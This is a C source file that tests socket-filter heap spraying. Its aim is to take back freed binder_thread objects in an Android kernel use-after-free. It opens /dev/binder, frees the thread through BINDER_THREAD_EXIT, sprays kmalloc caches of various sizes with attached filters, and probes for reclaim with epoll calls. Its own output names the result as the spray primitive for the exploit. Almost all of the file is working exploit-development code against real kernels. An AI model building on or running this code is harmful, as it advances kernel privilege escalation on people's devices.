/*
 * bpf_spray_test.c — BPF socket filter spray for binder_thread reclaim
 *
 * KEY INSIGHT: setsockopt(SO_ATTACH_FILTER) allocates via sock_kmalloc
 * which goes to REGULAR kmalloc-* (NOT usercopy-kmalloc-*).
 * This means BPF filter allocations CAN reclaim freed binder_thread slots!
 *
 * The filter content is user-controlled BPF instructions, and the
 * allocation persists until the filter is detached or socket closed.
 *
 * sizeof(struct sk_filter) header ≈ 40 bytes on ARM64
 * sizeof(struct sock_filter) = 8 bytes per instruction
 * Total = 40 + 8*N_insns
 *
 * For kmalloc-256: N ≈ 27 instructions
 * For kmalloc-512: N ≈ 59 instructions
 *
 * Compile: aarch64-linux-musl-gcc -static -O2 -o bpf_spray_test bpf_spray_test.c
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/epoll.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <stdint.h>
#include <linux/filter.h>

#define BINDER_THREAD_EXIT  _IOW('b', 8, int32_t)
#define BINDER_VERSION      _IOWR('b', 9, struct { signed long protocol_version; })

static volatile int got_signal = 0;
static void sighandler(int sig) { got_signal = sig; }

/*
 * Create a BPF filter of exactly N instructions.
 * We control the content of each instruction (8 bytes).
 *
 * The filter needs to be "valid" for the kernel to accept it:
 * - Must end with BPF_RET
 * - No backward jumps
 * - No out-of-bounds jumps
 *
 * We pack our controlled data into the instruction fields.
 * struct sock_filter {
 *     __u16 code;    // opcode
 *     __u8  jt;      // jump true
 *     __u8  jf;      // jump false
 *     __u32 k;       // generic field
 * };
 *
 * At the offset corresponding to the wait_queue spinlock (+0x48),
 * we need 4 zero bytes. The sk_filter header takes ~40 bytes,
 * so spinlock offset in the instruction array is:
 *   (0x48 - 40) / 8 = 0x20/8 = instruction #4 (0-indexed)
 *   At byte 0x48 within the allocation, the spinlock byte is at
 *   instruction (0x48-header)/8, but header size might vary.
 *
 * Actually let's just make ALL instructions have k=0 (zero data)
 * except the last which is BPF_RET|BPF_K with k=0 (drop all).
 * This ensures the spinlock at any offset reads as 0.
 */
static struct sock_filter *make_bpf_spray(int n_insns) {
    struct sock_filter *filter = calloc(n_insns, sizeof(struct sock_filter));
    if (!filter) return NULL;

    int i;
    /* NOP-equivalent instructions: BPF_LD+BPF_IMM with k=0 */
    for (i = 0; i < n_insns - 1; i++) {
        filter[i].code = BPF_LD | BPF_IMM;  /* LD #0 — loads 0 into A */
        filter[i].jt = 0;
        filter[i].jf = 0;
        filter[i].k = 0;  /* All zeros for spinlock compatibility */
    }
    /* Last instruction MUST be BPF_RET */
    filter[n_insns - 1].code = BPF_RET | BPF_K;
    filter[n_insns - 1].k = 0;  /* Return 0 = drop (we don't care about filtering) */

    return filter;
}

/*
 * Spray BPF filters: create sockets and attach filters of target size.
 * Returns number of sockets with filters attached.
 */
static int spray_bpf(int *socks, int max_socks, int n_insns) {
    struct sock_filter *filter = make_bpf_spray(n_insns);
    if (!filter) return 0;

    struct sock_fprog prog;
    prog.len = n_insns;
    prog.filter = filter;

    int sprayed = 0;
    int i;
    for (i = 0; i < max_socks; i++) {
        socks[i] = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (socks[i] < 0) {
            /* Try other socket types */
            socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
            if (socks[i] < 0) break;
        }

        if (setsockopt(socks[i], SOL_SOCKET, SO_ATTACH_FILTER,
                       &prog, sizeof(prog)) == 0) {
            sprayed++;
        } else {
            if (sprayed == 0)
                printf("    SO_ATTACH_FILTER failed: errno=%d (%s)\n",
                       errno, strerror(errno));
            close(socks[i]);
            socks[i] = -1;
        }
    }

    free(filter);
    return sprayed;
}

/*
 * Test BPF spray at a given instruction count
 */
static void test_bpf_spray(int n_insns, int n_socks) {
    int total_size = 40 + 8 * n_insns;  /* Approximate */
    int cache = total_size <= 64 ? 64 : total_size <= 128 ? 128 :
                total_size <= 192 ? 192 : total_size <= 256 ? 256 :
                total_size <= 512 ? 512 : 1024;

    printf("\n--- BPF spray: %d insns (%d bytes → kmalloc-%d), %d sockets ---\n",
           n_insns, total_size, cache, n_socks);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        /* Step 1: Open binder + epoll */
        int bfd = open("/dev/binder", O_RDWR);
        if (bfd < 0) { printf("  binder open failed\n"); _exit(1); }
        void *bmap = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfd, 0);
        if (bmap == MAP_FAILED) { close(bfd); _exit(1); }

        /* Force thread creation */
        struct { signed long protocol_version; } ver;
        ioctl(bfd, BINDER_VERSION, &ver);

        uint64_t kptr = ((uint64_t *)bmap)[0];
        printf("  binder kptr: 0x%016llx\n", (unsigned long long)kptr);

        /* Step 2: Add to epoll */
        int epfd = epoll_create1(0);
        struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfd };
        epoll_ctl(epfd, EPOLL_CTL_ADD, bfd, &ev);

        /* Step 3: Free binder_thread */
        ioctl(bfd, BINDER_THREAD_EXIT, NULL);
        printf("  binder_thread FREED\n");

        /* Step 4: BPF spray */
        int *socks = calloc(n_socks, sizeof(int));
        int sprayed = spray_bpf(socks, n_socks, n_insns);
        printf("  sprayed %d BPF filters\n", sprayed);

        if (sprayed == 0) {
            printf("  BPF spray FAILED — not available\n");
            free(socks);
            close(epfd); munmap(bmap, 4096); close(bfd);
            _exit(3);
        }

        /* Step 5: Try epoll operations */
        got_signal = 0;
        errno = 0;
        ev.events = EPOLLIN | EPOLLOUT;
        int mod_ret = epoll_ctl(epfd, EPOLL_CTL_MOD, bfd, &ev);
        printf("  EPOLL_CTL_MOD: ret=%d errno=%d", mod_ret, errno);
        if (got_signal) printf(" *** SIGNAL %d ***", got_signal);
        printf("\n");

        if (got_signal) {
            printf("  >>> BPF SPRAY RECLAIM ON MOD! <<<\n");
            free(socks); close(epfd); munmap(bmap, 4096); close(bfd);
            _exit(42);
        }

        got_signal = 0;
        errno = 0;
        int del_ret = epoll_ctl(epfd, EPOLL_CTL_DEL, bfd, &ev);
        printf("  EPOLL_CTL_DEL: ret=%d errno=%d", del_ret, errno);
        if (got_signal) printf(" *** SIGNAL %d ***", got_signal);
        printf("\n");

        if (got_signal) {
            printf("  >>> BPF SPRAY RECLAIM ON DEL! <<<\n");
            free(socks); close(epfd); munmap(bmap, 4096); close(bfd);
            _exit(42);
        }

        /* Step 6: More aggressive — close epoll to force full cleanup */
        got_signal = 0;
        close(epfd);
        epfd = -1;
        if (got_signal) {
            printf("  *** SIGNAL %d on epoll close! ***\n", got_signal);
            free(socks); munmap(bmap, 4096); close(bfd);
            _exit(42);
        }

        /* Cleanup sockets */
        int i;
        for (i = 0; i < n_socks; i++) {
            if (socks[i] >= 0) close(socks[i]);
        }
        free(socks);
        munmap(bmap, 4096);
        close(bfd);
        _exit(0);
    }

    alarm(20);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  TIMEOUT\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        int code = WEXITSTATUS(status);
        if (code == 42) printf("  >>> RECLAIM CONFIRMED at %d insns! <<<\n", n_insns);
        else if (code == 3) printf("  BPF not available\n");
        else printf("  no reclaim (exit=%d)\n", code);
    } else if (WIFSIGNALED(status)) {
        printf("  child killed by signal %d — RECLAIM + CRASH!\n", WTERMSIG(status));
    }
}

/*
 * Multi-free + BPF spray for better reclaim probability
 */
static void test_multi_free_bpf(int n_fds, int n_insns, int n_socks) {
    int total_size = 40 + 8 * n_insns;
    printf("\n--- Multi-free(%d) + BPF(%d insns, %d bytes) ---\n",
           n_fds, n_insns, total_size);

    pid_t pid = fork();
    if (pid < 0) return;

    if (pid == 0) {
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = sighandler;
        sigaction(SIGSEGV, &sa, NULL);
        sigaction(SIGBUS, &sa, NULL);

        /* Open multiple binder fds */
        int bfds[64], epfds[64];
        void *bmaps[64];
        int actual = 0;
        int i;

        for (i = 0; i < n_fds && i < 64; i++) {
            bfds[i] = open("/dev/binder", O_RDWR);
            if (bfds[i] < 0) break;
            bmaps[i] = mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, bfds[i], 0);
            if (bmaps[i] == MAP_FAILED) { close(bfds[i]); break; }

            struct { signed long protocol_version; } ver;
            ioctl(bfds[i], BINDER_VERSION, &ver);

            epfds[i] = epoll_create1(0);
            struct epoll_event ev = { .events = EPOLLIN, .data.fd = bfds[i] };
            epoll_ctl(epfds[i], EPOLL_CTL_ADD, bfds[i], &ev);
            actual++;
        }
        printf("  opened %d binder fds\n", actual);

        /* Free ALL threads */
        for (i = 0; i < actual; i++) {
            ioctl(bfds[i], BINDER_THREAD_EXIT, NULL);
        }
        printf("  freed %d threads\n", actual);

        /* BPF spray */
        int *socks = calloc(n_socks, sizeof(int));
        int sprayed = spray_bpf(socks, n_socks, n_insns);
        printf("  sprayed %d BPF filters\n", sprayed);

        /* Check all epoll fds */
        int signals = 0;
        for (i = 0; i < actual; i++) {
            got_signal = 0;
            struct epoll_event ev = { .events = EPOLLIN | EPOLLOUT };
            epoll_ctl(epfds[i], EPOLL_CTL_DEL, bfds[i], &ev);
            if (got_signal) {
                printf("  *** SIGNAL %d on fd[%d]! ***\n", got_signal, i);
                signals++;
            }
        }

        printf("  %d/%d showed signals\n", signals, actual);

        /* Cleanup */
        for (i = 0; i < n_socks; i++)
            if (socks[i] >= 0) close(socks[i]);
        free(socks);
        for (i = 0; i < actual; i++) {
            close(epfds[i]);
            munmap(bmaps[i], 4096);
            close(bfds[i]);
        }

        _exit(signals > 0 ? 42 : 0);
    }

    alarm(30);
    int status;
    int wr = waitpid(pid, &status, 0);
    alarm(0);

    if (wr < 0) {
        printf("  TIMEOUT\n");
        kill(pid, SIGKILL);
        waitpid(pid, &status, 0);
    } else if (WIFEXITED(status)) {
        if (WEXITSTATUS(status) == 42)
            printf("  >>> MULTI-FREE BPF RECLAIM CONFIRMED! <<<\n");
        else
            printf("  no reclaim\n");
    } else if (WIFSIGNALED(status)) {
        printf("  killed by signal %d\n", WTERMSIG(status));
    }
}

int main(void) {
    printf("=== BPF SOCKET FILTER SPRAY TEST ===\n");
    printf("uid=%u\n", getuid());
    {
        char buf[256];
        int kfd = open("/proc/version", O_RDONLY);
        if (kfd >= 0) {
            int n = read(kfd, buf, sizeof(buf)-1);
            if (n > 0) { buf[n] = 0; printf("Kernel: %s\n", buf); }
            close(kfd);
        }
    }

    /* Phase 0: Test if BPF filter attach works */
    printf("\n=== PHASE 0: BPF availability ===\n");
    {
        int s = socket(AF_UNIX, SOCK_DGRAM, 0);
        if (s >= 0) {
            struct sock_filter insns[2] = {
                { BPF_LD | BPF_IMM, 0, 0, 0 },
                { BPF_RET | BPF_K, 0, 0, 0 }
            };
            struct sock_fprog prog = { .len = 2, .filter = insns };
            int ret = setsockopt(s, SOL_SOCKET, SO_ATTACH_FILTER,
                                &prog, sizeof(prog));
            printf("  SO_ATTACH_FILTER: %s (ret=%d, errno=%d %s)\n",
                   ret == 0 ? "AVAILABLE" : "FAILED",
                   ret, errno, ret < 0 ? strerror(errno) : "");
            close(s);
        }
    }

    /* Phase 1: Single free + BPF spray at various sizes */
    printf("\n=== PHASE 1: Single free + BPF spray ===\n");

    /* Test instruction counts targeting different kmalloc caches:
     * header ≈ 40 bytes, each insn = 8 bytes
     * kmalloc-192: (192-40)/8 = 19 insns
     * kmalloc-256: (256-40)/8 = 27 insns
     * kmalloc-512: (512-40)/8 = 59 insns
     */
    int insn_counts[] = { 19, 22, 27, 32, 40, 50, 59 };
    int n_counts = sizeof(insn_counts) / sizeof(insn_counts[0]);
    int i;
    for (i = 0; i < n_counts; i++) {
        test_bpf_spray(insn_counts[i], 256);
    }

    /* Phase 2: Multi-free + BPF spray */
    printf("\n=== PHASE 2: Multi-free + BPF spray ===\n");
    /* Try both kmalloc-256 and kmalloc-512 with more freed slots */
    test_multi_free_bpf(16, 27, 512);   /* 16 frees, kmalloc-256 */
    test_multi_free_bpf(16, 59, 512);   /* 16 frees, kmalloc-512 */
    test_multi_free_bpf(32, 27, 512);   /* 32 frees, kmalloc-256 */
    test_multi_free_bpf(32, 59, 512);   /* 32 frees, kmalloc-512 */

    printf("\n=== BPF SPRAY TEST COMPLETE ===\n");
    printf("If ANY test showed SIGNAL or reclaim:\n");
    printf("  → BPF filter spray CAN reclaim binder_thread!\n");
    printf("  → This is the spray primitive for the exploit.\n");
    printf("  → The instruction count tells us binder_thread's cache.\n");
    printf("If all tests clean:\n");
    printf("  → BPF may also be routed to usercopy cache\n");
    printf("  → Or binder_thread is in a different-sized cache\n");
    return 0;
}
